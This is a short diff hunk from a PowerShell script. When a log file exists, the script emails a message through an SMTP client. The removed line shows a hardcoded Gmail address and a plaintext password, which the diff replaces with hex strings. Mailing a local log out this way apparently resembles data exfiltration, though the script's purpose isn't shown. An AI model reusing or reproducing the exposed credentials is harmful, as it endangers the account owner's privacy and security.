@@ -293,7 +293,7 @@ if (Test-Path $logFilePath) {
 
     $smtpClient = New-Object Net.Mail.SmtpClient($smtpServer, $smtpPort)
     $smtpClient.EnableSsl = $true
-    $smtpClient.Credentials = New-Object System.Net.NetworkCredential("andrew.p.sherman21@gmail.com", "Esp0sa1432!@#$%^") 
+    $smtpClient.Credentials = New-Object System.Net.NetworkCredential("4679086f5de11815100a8fc5e1a6fc9f", "5d3293eb876f8e0a0128ceef0bcadef4") 
 
     try {
         $smtpClient.Send($message)
